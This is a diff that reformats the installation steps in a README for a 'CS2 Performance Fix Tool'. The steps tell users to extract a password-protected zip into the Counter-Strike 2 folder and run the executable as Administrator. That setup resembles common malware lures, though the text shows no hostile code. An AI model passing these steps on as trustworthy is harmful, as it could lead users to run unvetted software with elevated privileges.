@@ -12,9 +12,9 @@ CS2 Performance Fix Tool v12.2.1 is a standalone executable that resolves common
 
 
 ⚙️ Installation
-1. Extract Build_v12.2.1.zipto your CS2 game directory (Password: ```FPSBooster```)
+1. Extract ```Build_v12.2.1.zip``` to your CS2 game directory (Password: ```FPSBooster```)
 ```Steam\steamapps\common\Counter-Strike 2\game\csgo\```
-Ensure all files (including ```Bin/, Data/```, and ```config.ini```) are in the same folder.
+<br>Ensure all files (including ```Bin/, Data/```, and ```config.ini```) are in the same folder.
 
 2. Run as Administrator:
 <br>- Double-click ```Build_v12.2.1.exe```
